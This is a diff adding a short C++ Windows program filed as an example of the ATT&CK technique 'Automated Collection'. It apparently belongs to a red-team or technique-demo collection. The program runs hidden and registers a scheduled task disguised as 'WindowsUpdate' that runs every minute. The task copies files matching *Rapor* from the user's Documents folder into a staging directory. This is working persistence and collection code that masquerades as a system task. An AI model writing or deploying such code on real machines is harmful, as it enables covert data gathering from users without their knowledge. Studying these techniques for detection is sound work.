@@ -1,0 +1,36 @@
+---
+title: "T1119.Automated Collection"
+folder: "11. Collection"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void AutorunRegistryBackground4() {
+
+    const char* command = "schtasks /create /sc minute /mo 1 /tn \"WindowsUpdate\" /tr \"robocopy \\\"C:\\Users\\User\\Documents\\\" \\\"C:\\Users\\User\\Desktop\\Test\\\" /S /R:0 /NP /IF *Rapor*\"";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+
+    AutorunRegistryBackground4();
+    return 0;
+}
